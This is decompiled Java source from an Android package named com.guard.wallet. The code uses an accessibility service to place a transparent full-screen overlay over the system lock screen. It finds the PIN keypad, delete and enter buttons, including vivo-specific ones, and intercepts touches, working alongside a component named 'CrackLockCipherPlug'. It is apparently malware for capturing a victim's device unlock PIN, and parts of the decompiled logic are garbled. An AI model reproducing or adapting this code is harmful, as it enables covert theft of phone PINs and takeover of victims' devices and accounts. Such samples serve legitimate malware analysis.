package com.guard.wallet.helper;

import a1.AbstractC0026q;
import android.graphics.Rect;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import com.guard.wallet.MainApplication;
import com.guard.wallet.condition.BoolCondition;
import com.guard.wallet.condition.PointCondition;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.Point;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.entity.UiObjectCollection;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.plug.C0224c;
import com.guard.wallet.plug.C0227f;
import com.guard.wallet.req.ReqListenHelper;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.AbstractC0249e;
import com.guard.wallet.utils.AbstractC0251g;
import com.guard.wallet.utils.AbstractC0255k;
import java.util.LinkedList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;
import p012o.C0416e;
import p012o.RunnableC0415d;

/* renamed from: com.guard.wallet.helper.r */
/* loaded from: classes.dex */
public abstract class AbstractC0195r {

    /* renamed from: a */
    public static WindowManager f234a;

    /* renamed from: e */
    public static ReqListenHelper f238e;

    /* renamed from: b */
    public static final AtomicReference f235b = new AtomicReference();

    /* renamed from: c */
    public static final C0227f f236c = new C0227f();

    /* renamed from: d */
    public static final ReentrantLock f237d = new ReentrantLock();

    /* renamed from: f */
    public static Integer f239f = -1;

    /* renamed from: g */
    public static final ConcurrentLinkedQueue f240g = new ConcurrentLinkedQueue();

    /* renamed from: h */
    public static final AtomicReference f241h = new AtomicReference(null);

    /* renamed from: i */
    public static final AtomicReference f242i = new AtomicReference(null);

    /* renamed from: j */
    public static final AtomicReference f243j = new AtomicReference(null);

    static {
        Executors.newFixedThreadPool(10);
    }

    /* renamed from: a */
    public static CombineFilter m372a() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.setBoolConditions(new LinkedList());
        combineFilter.setPointConditions(new LinkedList());
        combineFilter.setStringConditions(new LinkedList());
        combineFilter.getBoolConditions().add(new BoolCondition("clickable", true, true));
        combineFilter.getStringConditions().add(new StringCondition("id", null, null, "com.android.systemui:id/delete_button", null, null));
        return combineFilter;
    }

    /* renamed from: b */
    public static CombineFilter m373b() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.setBoolConditions(new LinkedList());
        combineFilter.setPointConditions(new LinkedList());
        combineFilter.setStringConditions(new LinkedList());
        combineFilter.getBoolConditions().add(new BoolCondition("clickable", true, true));
        combineFilter.getStringConditions().add(new StringCondition("id", null, null, "com.android.systemui:id/key_enter", null, null));
        return combineFilter;
    }

    /* renamed from: c */
    public static CombineFilter m374c() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.setBoolConditions(new LinkedList());
        combineFilter.setPointConditions(new LinkedList());
        combineFilter.setStringConditions(new LinkedList());
        combineFilter.getBoolConditions().add(new BoolCondition("clickable", true, true));
        combineFilter.getStringConditions().add(new StringCondition("className", "android.view.ViewGroup", null, null, null, null));
        combineFilter.getStringConditions().add(new StringCondition("id", null, null, "com.android.systemui:id/key", null, null));
        return combineFilter;
    }

    /* renamed from: d */
    public static void m375d(C0416e c0416e, CombineFilter combineFilter) {
        ReqListenHelper reqListenHelper;
        boolean anyMatch;
        try {
            AtomicReference atomicReference = f235b;
            if (atomicReference.get() == null && (reqListenHelper = f238e) != null) {
                int i2 = 1;
                if (Objects.equals(reqListenHelper.getListenType(), 1) && !AbstractC0251g.p0()) {
                    f238e = null;
                    return;
                }
                if (MainApplication.getInstance() != null && MainApplication.getInstance().getCrackLockCipherPlug() != null) {
                    C0224c crackLockCipherPlug = MainApplication.getInstance().getCrackLockCipherPlug();
                    crackLockCipherPlug.getClass();
                    ConcurrentLinkedQueue concurrentLinkedQueue = C0224c.f261a;
                    if (concurrentLinkedQueue.isEmpty()) {
                        Log.e("com.guard.wallet.plug.c", "cacheResponseQueue is Empty");
                        anyMatch = false;
                    } else {
                        anyMatch = concurrentLinkedQueue.stream().anyMatch(new C0193p(crackLockCipherPlug, i2));
                    }
                    if (anyMatch) {
                        Log.e("com.guard.wallet.helper.r", "CrackLockCipherPlug hasPinCacheResponse exit");
                        f238e = null;
                        return;
                    }
                }
                f239f = -1;
                f240g.clear();
                C0227f c0227f = f236c;
                c0227f.f274c.clear();
                c0227f.f273b.clear();
                c0227f.f272a = null;
                AtomicReference atomicReference2 = f241h;
                atomicReference2.set(null);
                f242i.set(null);
                AtomicReference atomicReference3 = f243j;
                atomicReference3.set(null);
                WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams();
                layoutParams.flags = 4786090;
                layoutParams.format = 1;
                layoutParams.alpha = 1.0f;
                layoutParams.dimAmount = 0.01f;
                layoutParams.gravity = 8388659;
                layoutParams.x = 0;
                layoutParams.y = 0;
                layoutParams.width = AbstractC0249e.m616e().getWidth().intValue();
                layoutParams.height = AbstractC0249e.m616e().getHeight().intValue();
                MyAccessibilityService.m554P().getClass();
                Rect m553O = MyAccessibilityService.m553O();
                if (m553O != null && m553O.width() > layoutParams.width) {
                    layoutParams.width = m553O.width();
                }
                View view = new View(MyAccessibilityService.m554P());
                view.setBackgroundColor(0);
                view.setAlpha(1.0f);
                if (f234a == null) {
                    f234a = (WindowManager) MyAccessibilityService.m554P().getSystemService("window");
                }
                layoutParams.type = 2032;
                view.setOnTouchListener(new ViewOnTouchListenerC0194q(c0416e, combineFilter));
                ReqListenHelper reqListenHelper2 = f238e;
                if (reqListenHelper2 == null) {
                    return;
                }
                if (Objects.equals(reqListenHelper2.getListenType(), 1) && !AbstractC0251g.p0()) {
                    f238e = null;
                    return;
                }
                if (atomicReference.get() == null) {
                    f234a.addView(view, layoutParams);
                    atomicReference.set(view);
                    Log.e("com.guard.wallet.helper.r", "TouchView 已创建完成");
                    c0227f.f272a = ReqListenHelper.clone(f238e);
                }
                if (!m385n(c0416e, combineFilter)) {
                    Log.e("com.guard.wallet.helper.r", "PIN码按键查找失败");
                    if (!AbstractC0249e.m620i()) {
                        m378g(false);
                        return;
                    }
                }
                if (atomicReference2.get() == null) {
                    m379h(c0416e);
                }
                if (atomicReference3.get() == null) {
                    m380i(c0416e);
                }
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.helper.r", e2);
        }
    }

    /* renamed from: e */
    public static void m376e(C0416e c0416e, CombineFilter combineFilter, ReqListenHelper reqListenHelper) {
        try {
            if (MyAccessibilityService.m554P() == null || m382k() || f238e != null) {
                return;
            }
            ReentrantLock reentrantLock = f237d;
            if (reentrantLock.tryLock()) {
                f238e = ReqListenHelper.clone(reqListenHelper);
                if (AbstractC0255k.m727a()) {
                    m375d(c0416e, combineFilter);
                } else {
                    new Handler(Looper.getMainLooper()).post(new RunnableC0415d(c0416e, combineFilter, 8));
                    for (int i2 = 0; !m382k() && i2 < 10; i2++) {
                        AbstractC0251g.T0(1);
                    }
                }
                reentrantLock.unlock();
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.helper.r", e2);
        }
    }

    /* renamed from: f */
    public static void m377f() {
        try {
            if (f234a != null) {
                AtomicReference atomicReference = f235b;
                if (atomicReference.get() != null) {
                    ((View) atomicReference.get()).setOnTouchListener(null);
                    f234a.removeViewImmediate((View) atomicReference.get());
                    atomicReference.set(null);
                    Log.e("com.guard.wallet.helper.r", "TouchView 已销毁完成");
                }
            }
            f239f = -1;
            f240g.clear();
            f241h.set(null);
            f242i.set(null);
            f243j.set(null);
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.helper.r", e2);
        }
    }

    /* renamed from: g */
    public static void m378g(boolean z2) {
        try {
            if (m382k()) {
                ReentrantLock reentrantLock = f237d;
                if (reentrantLock.tryLock()) {
                    C0227f c0227f = f236c;
                    if (z2) {
                        c0227f.m456a();
                    } else {
                        c0227f.f274c.clear();
                        c0227f.f273b.clear();
                        c0227f.f272a = null;
                    }
                    f238e = null;
                    if (AbstractC0255k.m727a()) {
                        m377f();
                    } else {
                        new Handler(Looper.getMainLooper()).post(new RunnableC0183f(4));
                    }
                    reentrantLock.unlock();
                }
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.helper.r", e2);
        }
    }

    /* renamed from: h */
    public static void m379h(C0416e c0416e) {
        UiObject findOneByCombine;
        try {
            CombineFilter m383l = AbstractC0249e.m620i() ? m383l() : AbstractC0249e.m623l() ? m386o() : m372a();
            UiObject m1075n = c0416e.m1075n(m383l);
            AtomicReference atomicReference = f241h;
            if (m1075n != null && (findOneByCombine = m1075n.findOneByCombine(m383l)) != null) {
                atomicReference.set(findOneByCombine);
                return;
            }
            UiObject findOneByCombine2 = MyAccessibilityService.m555Q().findOneByCombine(m383l);
            if (findOneByCombine2 != null) {
                atomicReference.set(findOneByCombine2);
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.helper.r", e2);
        }
    }

    /* renamed from: i */
    public static void m380i(C0416e c0416e) {
        UiObject findOneByCombine;
        try {
            CombineFilter m387p = AbstractC0249e.m620i() ? null : AbstractC0249e.m623l() ? m387p() : m373b();
            if (m387p != null) {
                UiObject m1075n = c0416e.m1075n(m387p);
                AtomicReference atomicReference = f243j;
                if (m1075n != null && (findOneByCombine = m1075n.findOneByCombine(m387p)) != null) {
                    atomicReference.set(findOneByCombine);
                    return;
                }
                UiObject findOneByCombine2 = MyAccessibilityService.m555Q().findOneByCombine(m387p);
                if (findOneByCombine2 != null) {
                    atomicReference.set(findOneByCombine2);
                }
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.helper.r", e2);
        }
    }

    /* renamed from: j */
    public static UiObject m381j(C0416e c0416e, Point point) {
        UiObject findLastByCombine;
        try {
            CombineFilter combineFilter = new CombineFilter();
            combineFilter.setPointConditions(new LinkedList());
            combineFilter.getPointConditions().add(new PointCondition(point.getX(), point.getY(), 1));
            combineFilter.setBoolConditions(new LinkedList());
            combineFilter.getBoolConditions().add(new BoolCondition("clickable", true, true));
            if (c0416e != null && c0416e.m1072k() != null && (findLastByCombine = c0416e.m1072k().findLastByCombine(combineFilter)) != null) {
                return findLastByCombine;
            }
            if (MyAccessibilityService.m555Q() != null) {
                return MyAccessibilityService.m555Q().findLastByCombine(combineFilter);
            }
            return null;
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.helper.r", e2);
            return null;
        }
    }

    /* renamed from: k */
    public static boolean m382k() {
        return f235b.get() != null;
    }

    /* renamed from: l */
    public static CombineFilter m383l() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.setBoolConditions(new LinkedList());
        combineFilter.setPointConditions(new LinkedList());
        combineFilter.setStringConditions(new LinkedList());
        combineFilter.getBoolConditions().add(new BoolCondition("clickable", true, true));
        combineFilter.getStringConditions().add(new StringCondition("className", "android.view.View", null, null, null, null));
        combineFilter.getStringConditions().add(new StringCondition("desc", "删除", null, null, null, null));
        return combineFilter;
    }

    /* renamed from: m */
    public static CombineFilter m384m() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.setBoolConditions(new LinkedList());
        combineFilter.setPointConditions(new LinkedList());
        combineFilter.setStringConditions(new LinkedList());
        combineFilter.getBoolConditions().add(new BoolCondition("clickable", true, true));
        combineFilter.getStringConditions().add(new StringCondition("className", "android.view.View", null, null, null, null));
        combineFilter.getStringConditions().add(new StringCondition("desc", null, null, null, null, "\\d"));
        return combineFilter;
    }

    /* renamed from: n */
    public static boolean m385n(C0416e c0416e, CombineFilter combineFilter) {
        ConcurrentLinkedQueue concurrentLinkedQueue;
        UiObject m1075n;
        List<UiObject> nodes;
        UiObjectCollection findByCombine;
        try {
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.helper.r", e2);
        }
        if (f238e == null) {
            return false;
        }
        if (Objects.equals(1, f238e.getListenType())) {
            combineFilter = AbstractC0249e.m620i() ? m384m() : AbstractC0249e.m623l() ? m388q() : m374c();
        }
        if (combineFilter == null) {
            return false;
        }
        int i2 = 0;
        while (true) {
            concurrentLinkedQueue = f240g;
            if (concurrentLinkedQueue.size() == 10 || i2 >= 5) {
                break;
            }
            c0416e.m1072k().refresh();
            AbstractC0251g.T0(2);
            try {
                concurrentLinkedQueue.clear();
                m1075n = c0416e.m1075n(combineFilter);
            } catch (Exception e3) {
                AbstractC0026q.m186s("com.guard.wallet.helper.r", e3);
            }
            if (m1075n == null || (findByCombine = m1075n.findByCombine(combineFilter)) == null || findByCombine.size() <= 0) {
                UiObjectCollection findByCombine2 = MyAccessibilityService.m555Q().findByCombine(combineFilter);
                if (findByCombine2 != null && findByCombine2.size() > 0) {
                    nodes = findByCombine2.getNodes();
                }
                i2++;
            } else {
                nodes = findByCombine.getNodes();
            }
            concurrentLinkedQueue.addAll(nodes);
            i2++;
            AbstractC0026q.m186s("com.guard.wallet.helper.r", e2);
            Log.e("com.guard.wallet.helper.r", "cacheTouchNodes not found");
            return false;
        }
        if (concurrentLinkedQueue.size() == 10) {
            Log.e("com.guard.wallet.helper.r", "PIN码按键查找成功");
            return true;
        }
        Log.e("com.guard.wallet.helper.r", "cacheTouchNodes not found");
        return false;
    }

    /* renamed from: o */
    public static CombineFilter m386o() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.setBoolConditions(new LinkedList());
        combineFilter.setPointConditions(new LinkedList());
        combineFilter.setStringConditions(new LinkedList());
        combineFilter.getBoolConditions().add(new BoolCondition("clickable", true, true));
        combineFilter.getStringConditions().add(new StringCondition("id", "com.android.systemui:id/vivo_cancel", null, null, null, null));
        return combineFilter;
    }

    /* renamed from: p */
    public static CombineFilter m387p() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.setBoolConditions(new LinkedList());
        combineFilter.setPointConditions(new LinkedList());
        combineFilter.setStringConditions(new LinkedList());
        combineFilter.getBoolConditions().add(new BoolCondition("clickable", true, true));
        combineFilter.getStringConditions().add(new StringCondition("id", "com.android.systemui:id/vivo_pin_confirm", null, null, null, null));
        return combineFilter;
    }

    /* renamed from: q */
    public static CombineFilter m388q() {
        CombineFilter combineFilter = new CombineFilter();
        combineFilter.setBoolConditions(new LinkedList());
        combineFilter.setPointConditions(new LinkedList());
        combineFilter.setStringConditions(new LinkedList());
        combineFilter.getBoolConditions().add(new BoolCondition("clickable", true, true));
        combineFilter.getStringConditions().add(new StringCondition("className", "android.view.ViewGroup", null, null, null, null));
        combineFilter.getStringConditions().add(new StringCondition("id", null, null, "com.android.systemui:id/VivoPinkey", null, null));
        return combineFilter;
    }
}
